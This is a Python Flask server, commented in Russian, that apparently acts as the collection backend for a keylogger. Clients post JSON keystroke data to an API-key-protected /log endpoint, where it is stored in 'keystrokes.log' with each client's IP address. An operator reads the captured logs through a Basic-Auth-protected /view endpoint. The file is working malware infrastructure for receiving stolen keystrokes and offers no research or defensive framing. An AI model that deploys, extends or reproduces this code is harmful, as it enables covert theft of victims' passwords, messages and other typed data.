import os
import json
from flask import Flask, request, jsonify, make_response
from datetime import datetime
import base64

app = Flask(__name__)

# Секреты из переменных окружения
API_KEY = os.environ.get('API_KEY', 'default_key_change_me')
VIEW_PASSWORD = os.environ.get('VIEW_PASSWORD', 'default_view_password')  # новый пароль для просмотра

DATA_FILE = 'keystrokes.log'

def check_basic_auth(auth_header):
    """Проверяет Basic Auth: логин admin, пароль VIEW_PASSWORD."""
    if not auth_header or not auth_header.startswith('Basic '):
        return False
    try:
        # Декодируем base64
        credentials = base64.b64decode(auth_header[6:]).decode('utf-8')
        username, password = credentials.split(':', 1)
        return username == 'admin' and password == VIEW_PASSWORD
    except:
        return False

@app.route('/log', methods=['POST'])
def log_keystrokes():
    api_key = request.headers.get('X-API-Key')
    if api_key != API_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400

    data['server_time'] = datetime.now().isoformat()
    data['client_ip'] = request.remote_addr

    try:
        with open(DATA_FILE, 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, ensure_ascii=False) + '\n')
    except Exception as e:
        return jsonify({'error': f'Failed to write data: {str(e)}'}), 500

    return jsonify({'status': 'ok'}), 200

@app.route('/view', methods=['GET'])
def view_logs():
    # Проверяем Basic Auth
    auth = request.headers.get('Authorization')
    if not check_basic_auth(auth):
        # Если нет авторизации, просим её (возвращаем 401 с заголовком WWW-Authenticate)
        response = make_response('Unauthorized', 401)
        response.headers['WWW-Authenticate'] = 'Basic realm="Login required"'
        return response

    if not os.path.exists(DATA_FILE):
        return 'No data yet', 200

    with open(DATA_FILE, 'r', encoding='utf-8') as f:
        content = f.read()
    return content, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/health', methods=['GET'])
def health():
    return 'OK', 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
